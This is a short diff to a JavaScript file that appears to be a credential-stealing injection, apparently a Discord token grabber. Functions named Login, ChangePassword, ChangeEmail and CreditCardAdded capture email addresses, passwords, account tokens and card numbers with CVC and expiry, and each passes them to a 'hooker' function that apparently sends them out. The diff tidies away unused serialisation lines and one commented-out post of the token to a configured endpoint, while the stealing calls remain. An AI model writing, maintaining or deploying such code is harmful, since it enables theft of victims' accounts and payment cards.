@@ -284,7 +284,6 @@ async function FirstTime() {
                             }
 						}]
                     };
-                    let data = JSON.stringify(c);
                     hooker(c)
 
                 } else {
@@ -443,7 +442,6 @@ async function FirstTime() {
                                     }
 							}]
                             };
-                            let data = JSON.stringify(c);
                             hooker(c)
                             
                         }
@@ -890,7 +888,6 @@ async function Login(email, password, token) {
 											}]
             }
             
-            let data = JSON.stringify(params);
             hooker(params)
         })
     })
@@ -1042,10 +1039,6 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     }
 											}]
             }
-            let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            //post(config.UWUWED, UwU);
-            
             hooker(params)
         })
     })
@@ -1200,7 +1193,7 @@ async function ChangeEmail(newemail, password, token) {
 			}
 		]
             }
-            let data = JSON.stringify(params);
+
             hooker(params)
         })
     })
@@ -1260,7 +1253,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             }
         ]
         }
-        let data = JSON.stringify(params);
+
         hooker(params)
 }
 
